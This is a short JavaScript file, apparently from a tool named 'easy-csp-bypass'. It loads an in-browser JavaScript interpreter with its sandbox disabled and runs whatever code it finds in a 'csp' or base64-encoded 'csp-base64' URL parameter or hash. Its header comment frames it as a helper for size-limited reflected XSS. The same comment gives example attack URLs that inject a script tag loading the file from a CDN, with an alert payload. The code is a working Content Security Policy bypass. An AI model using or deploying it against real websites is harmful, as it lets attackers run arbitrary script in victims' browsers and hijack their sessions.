/*
    Reflected XSS scenario where you are size limited.

    This will look for the GET parameter "CSP" and evaluate it.

    Example:
    - http://vulnerable.com/?csp=alert('1')&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
    - http://vulnerable.com/?csp-base64=YWxlcnQoMSk7&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>

    It also supports the same parameters in the URL hash, which can be useful if the URL's query parameter is being filtered for certain characters.
    
    Example:
    - http://vulnerable.com/#csp=alert('1')&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
    - http://vulnerable.com/#csp-base64=YWxlcnQoMSk7&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
*/
import Sval from 'sval'

const options = {
  ecmaVer: 9,
  sandBox: false,
}

const interpreter = new Sval(options)

window.addEventListener("load", () => {
    const hash = window.location.hash.substring(1);
    const hashParams = new URLSearchParams(hash);
    if (hashParams.has('csp') || hashParams.has('csp-base64')) {
        const hashCsp = hashParams.get('csp');
        if (hashCsp) interpreter.run(hashCsp);

        const hashCspBase64 = hashParams.get('csp-base64');
        if (hashCspBase64) interpreter.run(atob(hashCspBase64));
        return;
    }

    const urlParams = new URLSearchParams(window.location.search);
    let csp = urlParams.get('csp');
    if (csp) interpreter.run(csp)

    csp = urlParams.get('csp-base64');
    if (csp) interpreter.run(atob(csp))
});
